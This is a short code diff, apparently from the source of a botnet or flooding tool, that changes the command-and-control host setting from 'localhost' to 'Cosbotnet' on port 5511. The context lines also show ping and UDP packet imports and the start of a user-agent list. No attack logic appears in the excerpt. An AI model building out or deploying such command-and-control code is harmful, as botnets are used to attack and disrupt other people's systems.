@@ -10,7 +10,7 @@ from uuid import UUID, uuid4
 from icmplib import ping as pig
 from scapy.layers.inet import UDP
     
-C2Host  = "localhost"
+C2Host  = "Cosbotnet"
 C2Port  = 5511
 
 base_user_agents = [
